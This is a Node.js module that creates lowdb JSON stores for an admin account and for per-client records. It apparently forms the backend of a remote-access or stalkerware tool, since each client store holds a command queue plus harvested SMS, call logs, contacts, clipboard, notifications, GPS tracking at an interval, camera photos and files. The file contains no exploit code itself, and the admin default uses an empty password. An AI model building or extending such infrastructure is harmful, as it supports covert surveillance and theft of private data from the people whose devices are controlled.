const fs = require('fs');
const path = require('path');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const config = require('./config');

// Ensure directories exist
[config.dbPath, config.downloadsPath, config.photosPath, path.join(config.dbPath, 'clients')]
    .forEach(dir => fs.existsSync(dir) || fs.mkdirSync(dir, { recursive: true }));

// Main database
const main = low(new FileSync(path.join(config.dbPath, 'main.json')));
main.defaults({
    admin: { user: 'admin', pass: '', token: '' },
    clients: []
}).write();

// Get or create client database
function client(id) {
    const file = path.join(config.dbPath, 'clients', `${id}.json`);
    const db = low(new FileSync(file));
    
    db.defaults({
        id,
        queue: [],
        sms: [],
        calls: [],
        contacts: [],
        wifi: [],
        clipboard: [],
        notifications: [],
        permissions: [],
        apps: [],
        gps: [],
        gpsInterval: 0,
        downloads: [],
        files: [],
        cameras: [],
        photos: []
    }).write();
    
    return db;
}

module.exports = { main, client };
